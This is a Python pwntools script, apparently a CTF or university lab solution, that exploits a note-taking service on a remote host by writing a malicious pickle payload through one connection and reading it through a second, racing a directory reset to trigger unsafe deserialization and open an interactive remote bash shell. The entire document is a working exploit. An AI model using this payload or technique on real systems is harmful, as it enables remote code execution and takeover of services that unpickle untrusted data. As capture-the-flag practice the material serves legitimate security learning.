from pwn import * # type: ignore
import pickle
import os

HOST = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25653

class Exploit(object):
    def __reduce__(self):
        return (os.system, ("/bin/bash",))
payload = pickle.dumps(Exploit())

print(f"Generated payload: {payload}")

note_name = "exploit_note"

s = remote(HOST, PORT)

s.recvuntil(b'Username: ')
s.sendline(b'jmrp')

s.recvuntil(b'>>>')
s.sendline(b'0') # Classy

# Enquanto crio um com uma ligação, vou escrever com a outra(porque o classy sempre que escreve, dá reset aos dirs)
s2 = remote(HOST, PORT)
s2.recvuntil(b'Username: ')
s2.sendline(b'jmrp')
s2.recvuntil(b'>>>')
s2.sendline(b'1') # Free Note
s2.recvuntil(b'>>>')
s2.sendline(b'1') # Write Note
s2.recvuntil(b'note_name: ')
s2.sendline(note_name.encode())
s2.recvuntil(b'note_content: ')
s2.sendline(payload)
s2.sendline(b'')
s2.close()

# Agora leio o ficheiro com a outra ligação para executar o exploit
s.recvuntil(b'>>>')
s.sendline(b'0') # Read Note
s.recvuntil(b'note_name: ')
s.sendline(note_name.encode())
#print(s.recvall())
s.interactive() # Estou a executar a shell no servidor remoto, logo preciso de interagir com o .interactive()
